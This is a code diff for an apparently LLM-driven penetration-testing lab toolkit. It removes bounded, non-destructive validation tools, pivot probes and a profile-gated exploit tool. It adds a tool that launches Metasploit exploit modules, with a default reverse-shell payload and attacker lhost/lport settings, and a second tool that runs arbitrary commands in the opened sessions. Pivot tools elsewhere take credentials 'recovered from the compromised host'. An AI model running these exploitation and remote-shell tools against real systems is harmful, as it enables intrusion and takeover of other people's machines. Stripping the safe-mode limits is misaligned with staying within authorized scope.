@@ -17,12 +17,10 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 from urllib.error import HTTPError, URLError
-from urllib.parse import urlencode, urljoin
+from urllib.parse import urljoin, urlparse
 from urllib.request import Request, urlopen
 
-from src.core.runtime.session_manager import SessionReusePolicy
 from src.core.runtime.txt_trace_logger import resolve_runtime_store_root
-from src.core.validation import ValidationPlan, ValidationResult, VulnerabilityProfile
 
 
 DEFAULT_DISCOVERY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/admin", "/login"]
@@ -31,23 +29,6 @@ DEFAULT_COMMAND_TIMEOUT_SECONDS = 120
 MAX_COMMAND_TIMEOUT_SECONDS = 300
 MAX_OUTPUT_CHARS = 20000
 DEFAULT_FFUF_WORDS = ["admin", "login", "robots.txt", "sitemap.xml", "api", "debug", "health"]
-SAFE_VALIDATION_PROFILES: dict[str, VulnerabilityProfile] = {
-    "lab-http-accessible": VulnerabilityProfile(
-        vulnerability_id="lab-http-accessible",
-        affected_products=["generic-http"],
-        required_service="http",
-        required_paths=["/"],
-        safe_validation_methods=["http_probe"],
-    ),
-    "lab-default-cred": VulnerabilityProfile(
-        vulnerability_id="lab-default-cred",
-        affected_products=["generic-http-basic"],
-        required_service="http",
-        required_paths=["/"],
-        safe_validation_methods=["http_basic_auth_check"],
-        requires_auth=True,
-    ),
-}
 _HIDDEN_FIXTURE_CACHE: tuple[Path, float, dict[str, Any]] | None = None
 
 
@@ -192,172 +173,6 @@ LAB_TOOL_SPECS: list[dict[str, Any]] = [
         },
     },
     {
-        "name": "vuln_profile_match",
-        "description": "Match known bounded vulnerability validation profiles to observed lab service metadata.",
-        "inputSchema": {
-            "type": "object",
-            "properties": {
-                "service": {"type": "string"},
-                "product": {"type": "string"},
-                "version": {"type": "string"},
-                "target_url": {"type": "string"},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "validation_precheck",
-        "description": "Check non-destructive preconditions for a safe validation profile against a lab target.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["target_url", "profile_id"],
-            "properties": {
-                "target_url": {"type": "string"},
-                "profile_id": {"type": "string"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "safe_vuln_validate",
-        "description": "Run one bounded non-destructive vulnerability validation profile against an authorized lab target.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["target_url", "profile_id"],
-            "properties": {
-                "target_url": {"type": "string"},
-                "profile_id": {"type": "string"},
-                "username": {"type": "string"},
-                "password": {"type": "string"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-                "safe_mode": {"type": "boolean", "default": True},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "credential_check",
-        "description": "Validate one provided credential against one lab auth service; no brute forcing.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["auth_method", "target_url", "credential_id", "username", "password"],
-            "properties": {
-                "auth_method": {"type": "string"},
-                "target_url": {"type": "string"},
-                "credential_id": {"type": "string"},
-                "target_service_id": {"type": "string"},
-                "username": {"type": "string"},
-                "password": {"type": "string"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "session_probe",
-        "description": "Check whether a lab session handle has enough metadata to be reused.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["session_id"],
-            "properties": {
-                "session_id": {"type": "string"},
-                "bound_target": {"type": "string"},
-                "bound_identity": {"type": "string"},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "session_open_lab",
-        "description": "Register a bounded lab session handle for runtime coordination.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["session_id"],
-            "properties": {
-                "session_id": {"type": "string"},
-                "bound_target": {"type": "string"},
-                "bound_identity": {"type": "string"},
-                "lease_seconds": {"type": "integer", "minimum": 1},
-                "reuse_policy": {"type": "string"},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "identity_context_probe",
-        "description": "Return declared lab identity context facts for a session or host.",
-        "inputSchema": {"type": "object", "properties": {}, "additionalProperties": True},
-    },
-    {
-        "name": "privilege_context_probe",
-        "description": "Return declared lab privilege context facts without running escalation payloads.",
-        "inputSchema": {"type": "object", "properties": {}, "additionalProperties": True},
-    },
-    {
-        "name": "pivot_route_probe",
-        "description": "Verify a candidate lab pivot route with bounded TCP or HTTP reachability checks.",
-        "inputSchema": {
-            "type": "object",
-            "required": ["destination_host", "destination_port"],
-            "properties": {
-                "route_id": {"type": "string"},
-                "source_host": {"type": "string"},
-                "via_host": {"type": "string"},
-                "session_id": {"type": "string"},
-                "destination_host": {"type": "string"},
-                "destination_port": {"type": "integer"},
-                "protocol": {"type": "string", "default": "tcp"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "internal_service_discover",
-        "description": (
-            "Probe one internal lab service using bounded TCP or HTTP checks. When route_id is set the "
-            "probe runs over the SSH pivot; supply pivot_username/pivot_password (recovered from the "
-            "compromised host) to authenticate that hop."
-        ),
-        "inputSchema": {
-            "type": "object",
-            "required": ["host", "port"],
-            "properties": {
-                "host": {"type": "string"},
-                "port": {"type": "integer"},
-                "protocol": {"type": "string", "default": "tcp"},
-                "path": {"type": "string", "default": "/"},
-                "route_id": {"type": "string"},
-                "pivot_username": {"type": "string"},
-                "pivot_password": {"type": "string"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "pivoted_nmap_scan",
-        "description": (
-            "Run a bounded nmap scan against the restricted zone through a configured pivot route. "
-            "Supply pivot_username/pivot_password (e.g. SSH credentials recovered from the compromised "
-            "entry host) to authenticate the pivot hop; target should be a restricted-zone host or CIDR."
-        ),
-        "inputSchema": {
-            "type": "object",
-            "required": ["target", "route_id"],
-            "properties": {
-                "target": {"type": "string"},
-                "ports": {"type": "string"},
-                "route_id": {"type": "string"},
-                "pivot_username": {"type": "string"},
-                "pivot_password": {"type": "string"},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
         "name": "controlled_data_read_proof",
         "description": (
             "Read one row from a restricted-zone database over a configured pivot route and return a "
@@ -495,28 +310,6 @@ LAB_TOOL_SPECS: list[dict[str, Any]] = [
         },
     },
     {
-        "name": "lab_authorized_exploit_execute",
-        "description": (
-            "Execute a bounded, lab-authorized exploit via a pre-registered exploit profile. "
-            "exploit_profile_id must reference a profile in configs/exploit_profiles/. "
-            "Only operations declared in the profile's allowed_operations are executed. "
-            "All evidence is written to /opt/aegra/ paths. Raw markers are never returned."
-        ),
-        "inputSchema": {
-            "type": "object",
-            "required": ["exploit_profile_id", "target_url"],
-            "properties": {
-                "exploit_profile_id": {"type": "string"},
-                "target_url": {"type": "string"},
-                "session_id": {"type": "string"},
-                "route_id": {"type": "string"},
-                "extra_params": {"type": "object", "additionalProperties": {"type": "string"}},
-                "timeout_seconds": {"type": "integer", "minimum": 1},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
         "name": "post_access_observe",
         "description": (
             "Observe post-access lab artifacts from declared drop zones (/opt/aegra/flags/, "
@@ -550,29 +343,6 @@ LAB_TOOL_SPECS: list[dict[str, Any]] = [
                 "goal_id": {"type": "string"},
                 "session_id": {"type": "string"},
                 "route_id": {"type": "string"},
-            },
-            "additionalProperties": True,
-        },
-    },
-    {
-        "name": "pivot_route_register",
-        "description": (
-            "Register a validated pivot route for runtime coordination. "
-            "Requires destination_host and destination_port to already be confirmed reachable "
-            "via pivot_route_probe. Returns a route_id for use by internal tools."
-        ),
-        "inputSchema": {
-            "type": "object",
-            "required": ["destination_host", "destination_port"],
-            "properties": {
-                "route_id": {"type": "string"},
-                "source_host": {"type": "string"},
-                "via_host": {"type": "string"},
-                "session_id": {"type": "string"},
-                "destination_host": {"type": "string"},
-                "destination_port": {"type": "integer"},
-                "protocol": {"type": "string", "default": "tcp"},
-                "zone_ref": {"type": "string"},
             },
             "additionalProperties": True,
         },
@@ -617,6 +387,51 @@ LAB_TOOL_SPECS: list[dict[str, Any]] = [
             "additionalProperties": True,
         },
     },
+    {
+        "name": "metasploit_exec",
+        "description": (
+            "Run a Metasploit exploit module against an authorized target via the msfrpcd "
+            "engine and, on success, open a real session. Returns the opened session_id only "
+            "(never raw shell output). Supply module (e.g. exploit/multi/http/"
+            "struts2_content_type_ognl), target (host or url), and optionally rport, target_uri, "
+            "payload (default linux/x64/shell_reverse_tcp), lhost/lport, and an options map for "
+            "extra module datastore keys."
+        ),
+        "inputSchema": {
+            "type": "object",
+            "required": ["module", "target"],
+            "properties": {
+                "module": {"type": "string"},
+                "target": {"type": "string"},
+                "rport": {"type": "integer"},
+                "target_uri": {"type": "string"},
+                "payload": {"type": "string"},
+                "lhost": {"type": "string"},
+                "lport": {"type": "integer"},
+                "options": {"type": "object", "additionalProperties": True},
+                "timeout_seconds": {"type": "integer", "minimum": 1},
+            },
+            "additionalProperties": True,
+        },
+    },
+    {
+        "name": "session_exec",
+        "description": (
+            "Run one command in an established Metasploit session (opened by metasploit_exec) "
+            "and return its output. Supply session_id plus command (or argv)."
+        ),
+        "inputSchema": {
+            "type": "object",
+            "required": ["session_id"],
+            "properties": {
+                "session_id": {"type": "string"},
+                "command": {"type": "string"},
+                "argv": {"type": "array", "items": {"type": "string"}},
+                "timeout_seconds": {"type": "integer", "minimum": 1},
+            },
+            "additionalProperties": True,
+        },
+    },
 ]
 
 OPTIONAL_TOOL_BINARIES: dict[str, str] = {
@@ -625,13 +440,25 @@ OPTIONAL_TOOL_BINARIES: dict[str, str] = {
     "ffuf_discover": "ffuf",
 }
 
+MSF_TOOLS: frozenset[str] = frozenset({"metasploit_exec", "session_exec"})
+
+
 #根据当前环境检查工具是否可用
 def lab_tool_specs(*, include_unavailable: bool = False) -> list[dict[str, Any]]:
     """Return tool specs that reflect binaries available in the current runtime."""
 
     specs: list[dict[str, Any]] = []
+    msf_ok = _msf_available()
     for spec in LAB_TOOL_SPECS:
         name = str(spec.get("name") or "")
+        if name in MSF_TOOLS and not msf_ok:
+            if not include_unavailable:
+                continue
+            annotated = dict(spec)
+            annotated["available"] = False
+            annotated["unavailable_reason"] = "msfrpcd is not configured (adapter_policy.metasploit) or pymetasploit3 is not installed"
+            specs.append(annotated)
+            continue
         binary = OPTIONAL_TOOL_BINARIES.get(name)
         if binary and shutil.which(binary) is None:
             if not include_unavailable:
@@ -680,32 +507,14 @@ def call_lab_tool(name: str, arguments: dict[str, Any]) -> dict[str, Any]:
             return _ensure_raw_output_ref(arguments=arguments, payload=_tcp_connect_probe(arguments))
         if name == "http_basic_auth_check":
             return _ensure_raw_output_ref(arguments=arguments, payload=_http_basic_auth_check(arguments))
-        if name == "vuln_profile_match":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_vuln_profile_match(arguments))
-        if name == "validation_precheck":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_validation_precheck(arguments))
-        if name == "safe_vuln_validate":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_safe_vuln_validate(arguments))
-        if name == "credential_check":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_credential_check(arguments))
-        if name == "session_probe":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_session_probe(arguments))
-        if name == "session_open_lab":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_session_open_lab(arguments))
-        if name == "identity_context_probe":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_identity_context_probe(arguments))
-        if name == "privilege_context_probe":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_privilege_context_probe(arguments))
-        if name == "pivot_route_probe":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_pivot_route_probe(arguments))
-        if name == "internal_service_discover":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_internal_service_discover(arguments))
-        if name == "pivoted_nmap_scan":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_pivoted_nmap_scan(arguments))
         if name == "controlled_data_read_proof":
             return _ensure_raw_output_ref(arguments=arguments, payload=_controlled_data_read_proof(arguments))
         if name == "pivot_exec":
             return _ensure_raw_output_ref(arguments=arguments, payload=_pivot_exec(arguments))
+        if name == "metasploit_exec":
+            return _ensure_raw_output_ref(arguments=arguments, payload=_metasploit_exec(arguments))
+        if name == "session_exec":
+            return _ensure_raw_output_ref(arguments=arguments, payload=_session_exec(arguments))
         if name == "chain_goal_check":
             return _ensure_raw_output_ref(arguments=arguments, payload=_goal_check(arguments))
         if name == "goal_check":
@@ -718,14 +527,10 @@ def call_lab_tool(name: str, arguments: dict[str, Any]) -> dict[str, Any]:
             return _ensure_raw_output_ref(arguments=arguments, payload=_whatweb_fingerprint(arguments))
         if name == "ffuf_discover":
             return _ensure_raw_output_ref(arguments=arguments, payload=_ffuf_discover(arguments))
-        if name == "lab_authorized_exploit_execute":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_lab_authorized_exploit_execute(arguments))
         if name == "post_access_observe":
             return _ensure_raw_output_ref(arguments=arguments, payload=_post_access_observe(arguments))
         if name == "read_lab_marker":
             return _ensure_raw_output_ref(arguments=arguments, payload=_read_lab_marker(arguments))
-        if name == "pivot_route_register":
-            return _ensure_raw_output_ref(arguments=arguments, payload=_pivot_route_register(arguments))
         if name == "internal_goal_check":
             return _ensure_raw_output_ref(arguments=arguments, payload=_internal_goal_check(arguments))
         if name == "success_condition_check":
@@ -1064,277 +869,6 @@ def _http_basic_auth_check(arguments: dict[str, Any]) -> dict[str, Any]:
     )
 
 
-def _vuln_profile_match(arguments: dict[str, Any]) -> dict[str, Any]:
-    service = _string(arguments.get("service"))
-    product = (_string(arguments.get("product")) or "").lower()
-    parsed = _default_parsed()
-    matches: list[dict[str, Any]] = []
-    for profile in _validation_profiles().values():
-        if service and profile.required_service and service.lower() != profile.required_service.lower():
-            continue
-        if product and profile.affected_products and not any(
-            product in item.lower() or item.lower() in product for item in profile.affected_products
-        ):
-            continue
-        item = profile.model_dump(mode="json")
-        matches.append(item)
-        candidate_id = f"vuln-candidate::{profile.vulnerability_id}::{_string(arguments.get('target_url')) or service or 'unknown'}"
-        parsed["entities"].append(
-            {
-                "type": "VulnerabilityCandidate",
-                "candidate_id": candidate_id,
-                "vulnerability_id": profile.vulnerability_id,
-                "matched_profile_id": profile.vulnerability_id,
-                "affected_products": list(profile.affected_products),
-                "target_url": _string(arguments.get("target_url")),
-                "confidence": 0.75,
-            }
-        )
-        parsed["findings"].append(
-            {
-                "kind": "VulnerabilityCandidate",
-                "candidate_id": candidate_id,
-                "matched_profile_id": profile.vulnerability_id,
-                "evidence_refs": [],
-                "confidence": 0.75,
-            }
-        )
-    parsed["writeback_hints"] = {"observation_category": "vulnerability_profile_match"}
-    return _payload(success=True, stdout=json.dumps(matches, ensure_ascii=True, sort_keys=True), parsed=parsed)
-
-
-def _validation_precheck(arguments: dict[str, Any]) -> dict[str, Any]:
-    target_url = _required(arguments, "target_url")
-    profile = _profile(_required(arguments, "profile_id"))
-    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
-    checks = _run_profile_prechecks(target_url=target_url, profile=profile, timeout=timeout)
-    passed = all(item["passed"] for item in checks)
-    parsed = _default_parsed()
-    plan = ValidationPlan(
-        profile_id=profile.vulnerability_id,
-        target_ref=target_url,
-        preconditions=[f"path:{path}" for path in profile.required_paths],
-        tool_sequence=[{"tool": method, "target_url": target_url} for method in profile.safe_validation_methods],
-        expected_evidence=["reachable_required_paths"],
-        timeout_seconds=timeout,
-    )
-    parsed["entities"].append({"type": "validation_plan", **plan.model_dump(mode="json")})
-    parsed["runtime_hints"] = {"validation_precheck_passed": passed, "profile_id": profile.vulnerability_id}
-    parsed["writeback_hints"] = {"observation_category": "validation_precheck", "url": target_url}
-    return _payload(success=passed, stdout=json.dumps({"checks": checks}, ensure_ascii=True), exit_code=0 if passed else "precheck_failed", parsed=parsed)
-
-
-def _safe_vuln_validate(arguments: dict[str, Any]) -> dict[str, Any]:
-    if not bool(arguments.get("safe_mode", True)):
-        return _payload(
-            success=False,
-            stderr="safe_vuln_validate only supports safe_mode=true",
-            exit_code="unsafe_mode_rejected",
-            parsed={"runtime_hints": {"blocked_by": "unsafe_mode_rejected"}},
-        )
-    target_url = _required(arguments, "target_url")
-    profile = _profile(_required(arguments, "profile_id"))
-    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
-    checks = _run_profile_prechecks(target_url=target_url, profile=profile, timeout=timeout)
-    precheck_passed = all(item["passed"] for item in checks)
-    authenticated: bool | None = None
-    if profile.requires_auth:
-        username = _string(arguments.get("username"))
-        password = _string(arguments.get("password"))
-        if username is None or password is None:
-            validation = ValidationResult(
-                vulnerability_id=profile.vulnerability_id,
-                status="blocked",
-                confidence=0.0,
-                safe_payload_summary="validation not executed because provided credential was missing",
-                evidence={"checks": checks},
-                tool={"name": "safe_vuln_validate"},
-                failure_reason="credential_required",
-            )
-            return _validation_payload(validation=validation, target_url=target_url, success=False)
-        auth_result = _http_basic_auth_check({"url": target_url, "username": username, "password": password, "timeout_seconds": timeout})
-        authenticated = bool(auth_result.get("success"))
-    status = "validated" if (precheck_passed and (authenticated is True or not profile.requires_auth)) else "not_detected"
-    confidence = 0.92 if status == "validated" else 0.35
-    validation = ValidationResult(
-        vulnerability_id=profile.vulnerability_id,
-        status=status,  # type: ignore[arg-type]
-        confidence=confidence,
-        safe_payload_summary="executed bounded profile checks only; no exploit payload executed",
-        evidence={"checks": checks, "authenticated": authenticated},
-        tool={"name": "safe_vuln_validate", "profile_id": profile.vulnerability_id},
-    )
-    return _validation_payload(validation=validation, target_url=target_url, success=status == "validated")
-
-
-def _credential_check(arguments: dict[str, Any]) -> dict[str, Any]:
-    auth_method = _required(arguments, "auth_method")
-    if auth_method != "http_basic":
-        return _payload(
-            success=False,
-            stderr=f"unsupported credential auth_method: {auth_method}",
-            exit_code="unsupported_auth_method",
-            parsed={"runtime_hints": {"blocked_by": "unsupported_auth_method", "auth_method": auth_method}},
-        )
-    return _http_basic_auth_check(
-        {
-            "url": _required(arguments, "target_url"),
-            "username": _required(arguments, "username"),
-            "password": _required(arguments, "password"),
-            "credential_id": _required(arguments, "credential_id"),
-            "target_service_id": arguments.get("target_service_id"),
-            "timeout_seconds": arguments.get("timeout_seconds"),
-        }
-    )
-
-
-def _session_probe(arguments: dict[str, Any]) -> dict[str, Any]:
-    session_id = _required(arguments, "session_id")
-    reusable = bool(arguments.get("bound_target") or arguments.get("bound_identity"))
-    parsed = _default_parsed()
-    entity = {
-        "type": "session",
-        "session_id": session_id,
-        "bound_target": _string(arguments.get("bound_target")),
-        "bound_identity": _string(arguments.get("bound_identity")),
-        "reusable": reusable,
-    }
-    parsed["entities"].append(entity)
-    parsed["runtime_hints"] = {"session_id": session_id, "session_reusable": reusable}
-    parsed["writeback_hints"] = {"observation_category": "session_probe"}
-    return _payload(success=True, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), parsed=parsed)
-
-
-def _session_open_lab(arguments: dict[str, Any]) -> dict[str, Any]:
-    session_id = _required(arguments, "session_id")
-    lease_seconds = _int(arguments.get("lease_seconds"), 300)
-    requested_policy = _string(arguments.get("reuse_policy")) or "exclusive"
-    reuse_policy = SessionReusePolicy.coerce(requested_policy).value
-    parsed = _default_parsed()
-    parsed["runtime_hints"] = {
-        "open_session": True,
-        "session_id": session_id,
-        "bound_target": _string(arguments.get("bound_target")),
-        "bound_identity": _string(arguments.get("bound_identity")),
-        "lease_seconds": lease_seconds,
-        "reuse_policy": reuse_policy,
-    }
-    if reuse_policy != requested_policy:
-        # Surface the coercion so the caller (LLM) gets immediate feedback instead of
-        # silently believing its invented policy was accepted.
-        parsed["runtime_hints"]["reuse_policy_requested"] = requested_policy
-        parsed["runtime_hints"]["reuse_policy_note"] = (
-            f"reuse_policy {requested_policy!r} is not supported; using {reuse_policy!r}. "
-            f"valid values: {', '.join(p.value for p in SessionReusePolicy)}"
-        )
-    parsed["writeback_hints"] = {"observation_category": "session_open"}
-    return _payload(success=True, stdout=json.dumps(parsed["runtime_hints"], ensure_ascii=True, sort_keys=True), parsed=parsed)
-
-
-def _identity_context_probe(arguments: dict[str, Any]) -> dict[str, Any]:
-    identity = _string(arguments.get("identity")) or _string(arguments.get("username")) or "unknown"
-    host = _string(arguments.get("host")) or _string(arguments.get("target")) or "unknown-host"
-    parsed = _default_parsed()
-    entity = {"type": "identity_context", "host": host, "identity": identity, "session_id": _string(arguments.get("session_id"))}
-    parsed["entities"].append(entity)
-    parsed["runtime_hints"] = {
-        "identity": identity,
-        "host": host,
-        "identity_context_observed": True,
-        "pivot_route_candidates": _pivot_route_candidates(),
-    }
-    parsed["writeback_hints"] = {"observation_category": "identity_context"}
-    return _payload(success=True, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), parsed=parsed)
-
-
-def _privilege_context_probe(arguments: dict[str, Any]) -> dict[str, Any]:
-    identity = _string(arguments.get("identity")) or "unknown"
-    host = _string(arguments.get("host")) or "unknown-host"
-    privilege_level = _string(arguments.get("privilege_level")) or "low"
-    groups = _string_items(arguments.get("groups"))
-    parsed = _default_parsed()
-    entity = {
-        "type": "privilege_context",
-        "host": host,
-        "identity": identity,
-        "groups": groups,
-        "privilege_level": privilege_level,
-        "can_write_paths": _string_items(arguments.get("can_write_paths")),
-        "can_execute_commands": bool(arguments.get("can_execute_commands", False)),
-        "sudo_available": bool(arguments.get("sudo_available", False)),
-        "container_runtime": bool(arguments.get("container_runtime", False)),
-    }
-    parsed["entities"].append(entity)
-    parsed["findings"].append({"kind": "privilege_precheck", "status": privilege_level, "confidence": 0.8})
-    parsed["runtime_hints"] = {"privilege_level": privilege_level, "needs_privilege_task": privilege_level in {"low", "limited"}}
-    parsed["writeback_hints"] = {"observation_category": "privilege_context"}
-    return _payload(success=True, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), parsed=parsed)
-
-
-def _pivot_route_probe(arguments: dict[str, Any]) -> dict[str, Any]:
-    host = _required(arguments, "destination_host")
-    port = _int(arguments.get("destination_port"), 0)
-    if port <= 0 or port > 65535:
-        raise ValueError("destination_port must be between 1 and 65535")
-    protocol = (_string(arguments.get("protocol")) or "tcp").lower()
-    timeout = _int(arguments.get("timeout_seconds"), 5)
-    if protocol in {"http", "https"}:
-        url = f"{protocol}://{host}:{port}/"
-        try:
-            response = _open_url(url, method="GET", timeout=timeout)
-            reachable = int(response["status"]) < 500
-            error = ""
-        except Exception as exc:
-            reachable = False
-            error = str(exc)
-    else:
-        try:
-            with socket.create_connection((host, port), timeout=timeout):
-                reachable = True
-                error = ""
-        except OSError as exc:
-            reachable = False
-            error = str(exc)
-    route_id = _string(arguments.get("route_id")) or f"route::{_string(arguments.get('source_host')) or 'unknown-source'}::{host}:{port}"
-    parsed = _default_parsed()
-    entity = {
-        "type": "PivotRoute",
-        "route_id": route_id,
-        "source_host": _string(arguments.get("source_host")),
-        "via_host": _string(arguments.get("via_host")),
-        "destination_host": host,
-        "port": port,
-        "protocol": protocol,
-        "status": "validated" if reachable else "unreachable",
-        "confidence": 0.85 if reachable else 0.25,
-    }
-    parsed["entities"].append(entity)
-    parsed["evidence"].append({"kind": "reachability evidence", "route_id": route_id, "destination_host": host, "port": port, "reachable": reachable})
-    parsed["runtime_hints"] = {
-        "register_pivot_route": True,
-        "route_id": route_id,
-        "destination_host": host,
-        "source_host": _string(arguments.get("source_host")),
-        "via_host": _string(arguments.get("via_host")),
-        "session_id": _string(arguments.get("session_id")),
-        "allowed_ports": [port],
-        "protocol": protocol,
-        "reachable": reachable,
-        "reason": error,
-    }
-    parsed["writeback_hints"] = {"observation_category": "pivot_route_validation"}
-    return _payload(success=reachable, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), stderr=error, exit_code=0 if reachable else "unreachable", parsed=parsed)
-
-
-# --- Pivot transport (server-side, single converged egress) -----------------
-#
-# Everything that must reach the restricted zone goes through ONE transport
-# primitive: ``_run_via_configured_pivot``, which SSHes to the configured pivot
-# host (dual-homed dmz<->internal) and runs the given argv there. The other
-# ``_*_via_configured_pivot`` helpers are thin adapters that build the argv and
-# reshape the result for one operation -- they hold no transport logic of their
-# own. Credentials are read from env/route and never appear in any payload.
-
 _DATA_SERVICE_PORTS: dict[int, str] = {
     5432: "postgres",
     3306: "mysql",
@@ -1343,10 +877,6 @@ _DATA_SERVICE_PORTS: dict[int, str] = {
     6379: "redis",
     1521: "oracle",
 }
-
-
-def _service_name_for_port(port: int | None) -> str:
-    return _DATA_SERVICE_PORTS.get(int(port or 0), "unknown")
 
 
 def _load_runtime_pivot_routes() -> list[dict[str, Any]]:
@@ -1396,26 +926,6 @@ def _resolve_pivot_route(route_id: str | None) -> dict[str, Any] | None:
     return routes[0] if routes else None
 
 
-def _pivot_route_candidates() -> list[dict[str, Any]]:
-    """Redacted pivot routes for planner context -- never carries credentials."""
-
-    candidates: list[dict[str, Any]] = []
-    for route in _load_runtime_pivot_routes():
-        transport = route.get("transport") if isinstance(route.get("transport"), dict) else {}
-        candidates.append(
-            {
-                "route_id": _string(route.get("route_id")),
-                "source_host": _string(route.get("source_host")),
-                "via_host": _string(route.get("via_host")),
-                "destination_cidr": _string(route.get("destination_cidr")),
-                "destination_host": _string(route.get("destination_host")),
-                "protocol": _string(route.get("protocol")),
-                "transport_adapter": _string(transport.get("adapter")),
-            }
-        )
-    return candidates
-
-
 def _pivot_transport_available(arguments: dict[str, Any] | None = None) -> bool:
     return shutil.which("ssh") is not None and shutil.which("sshpass") is not None
 
@@ -1460,25 +970,6 @@ def _run_via_configured_pivot(
     return subprocess.run(ssh_argv, capture_output=True, text=True, timeout=timeout, check=False)
 
 
-def _probe_tcp_via_configured_pivot(
-    *,
-    route_id: str | None,
-    host: str,
-    port: int,
-    timeout: int,
-    username: str | None = None,
-    password: str | None = None,
-) -> dict[str, Any]:
-    completed = _run_via_configured_pivot(
-        route_id=route_id,
-        argv=["nc", "-z", "-w", str(max(1, timeout)), str(host), str(port)],
-        timeout=timeout,
-        username=username,
-        password=password,
-    )
-    return {"reachable": completed.returncode == 0, "stderr": completed.stderr or ""}
-
-
 def _run_psql_query_via_configured_pivot(
     *,
     route_id: str | None,
@@ -1503,40 +994,6 @@ def _run_psql_query_via_configured_pivot(
         password=pivot_password,
     )
     return {"success": completed.returncode == 0, "stdout": completed.stdout or "", "stderr": completed.stderr or ""}
-
-
-def _pivoted_nmap_scan(arguments: dict[str, Any]) -> dict[str, Any]:
-    target = _required(arguments, "target")
-    ports = _string(arguments.get("ports"))
-    route_id = _required(arguments, "route_id")
-    timeout = _int(arguments.get("timeout_seconds"), 60)
-    argv = ["nmap", "-Pn", "-sV"]
-    if ports:
-        argv += ["-p", ports]
-    argv.append(target)
-    completed = _run_via_configured_pivot(
-        route_id=route_id,
-        argv=argv,
-        timeout=timeout,
-        username=_string(arguments.get("pivot_username")),
-        password=_string(arguments.get("pivot_password")),
-    )
-    stdout = completed.stdout or ""
-    success = completed.returncode == 0
-    parsed = _parse_nmap_output(target, stdout)
-    services: list[dict[str, Any]] = []
-    for entity in parsed["entities"]:
-        if entity.get("type") != "Service":
-            continue
-        service_name = entity.get("service") or _service_name_for_port(entity.get("port"))
-        services.append(
-            {"host": entity.get("host"), "port": entity.get("port"), "service_name": service_name, "via_pivot_route": route_id}
-        )
-    parsed["services"] = services
-    hints = dict(parsed.get("runtime_hints") or {})
-    hints["via_pivot_route"] = route_id
-    parsed["runtime_hints"] = hints
-    return _payload(success=success, stdout=stdout, stderr=completed.stderr or "", exit_code=0 if success else "scan_failed", parsed=parsed)
 
 
 def _controlled_data_read_proof(arguments: dict[str, Any]) -> dict[str, Any]:
@@ -1637,85 +1094,6 @@ def _pivot_exec(arguments: dict[str, Any]) -> dict[str, Any]:
         exit_code=0 if success else "pivot_exec_failed",
         parsed=parsed,
     )
-
-
-def _internal_service_discover(arguments: dict[str, Any]) -> dict[str, Any]:
-    host = _required(arguments, "host")
-    port = _int(arguments.get("port"), 0)
-    protocol = (_string(arguments.get("protocol")) or "tcp").lower()
-    route_id = _string(arguments.get("route_id"))
-
-    if route_id:
-        # Restricted-zone service: reachable only through the configured pivot
-        # route, so the reachability probe is run over the pivot transport.
-        timeout = _int(arguments.get("timeout_seconds"), 5)
-        result = _probe_tcp_via_configured_pivot(
-            route_id=route_id,
-            host=host,
-            port=port,
-            timeout=timeout,
-            username=_string(arguments.get("pivot_username")),
-            password=_string(arguments.get("pivot_password")),
-        )
-        reachable = bool(result.get("reachable"))
-        service_name = _service_name_for_port(port)
-        evidence_id = f"internal-service::{route_id}::{host}:{port}"
-        parsed = _default_parsed()
-        parsed["services"] = [
-            {"host": host, "port": port, "service_name": service_name, "via_pivot_route": route_id, "reachable": reachable}
-        ]
-        parsed["entities"].append(
-            {
-                "type": "InternalService",
-                "host": host,
-                "port": port,
-                "protocol": protocol,
-                "service_name": service_name,
-                "via_pivot_route": route_id,
-                "confidence": 0.8 if reachable else 0.25,
-            }
-        )
-        parsed["evidence"].append(
-            {"evidence_id": evidence_id, "kind": "internal_service_discovery", "host": host, "port": port, "via_pivot_route": route_id}
-        )
-        runtime_hints: dict[str, Any] = {"via_pivot_route": route_id, "reachable": reachable}
-        parsed["runtime_hints"] = runtime_hints
-        parsed["writeback_hints"] = {"observation_category": "internal_service_discovery"}
-        return _payload(
-            success=reachable,
-            stdout=json.dumps(parsed["services"][0], ensure_ascii=True, sort_keys=True),
-            stderr=_string(result.get("stderr")) or "",
-            exit_code=0 if reachable else "unreachable",
-            parsed=parsed,
-        )
-
-    # No pivot route — direct bounded probe (entry zone).
